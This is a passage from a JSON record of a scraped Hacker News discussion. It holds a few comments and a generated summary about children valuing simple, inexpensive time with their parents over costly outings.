obvious \"no-shit-sherlock\" thing to anyone who ever hung out with a kid? reply jtbayly 2 hours agoparentIt’s an excellent reminder to anyone who ever hung out with a kid... Because it’s easy to forget. :) reply throwanem 2 hours agoparentprev [–] I don't think there is anyone on Earth not able to work it out, but I know for an ironclad fact there's those who can't be bothered. reply GuidelinesFAQListsAPISecurityLegalApply to YCContact Search:",
    "originSummary": [],
    "commentSummary": [
      "The post highlights that children often find joy in simple, inexpensive activities rather than costly, elaborate experiences.",
      "Multiple anecdotes from parents emphasize that kids value quality time and engagement over material or extravagant outings.",
      "The discussion underscores the importance of being present and engaged with children, suggesting that these moments create lasting, cherished memories."
    ],
    "points": 176,
    "commentCount": 66,
    "retryCount": 0,
    "time": 1727448380
  }
]
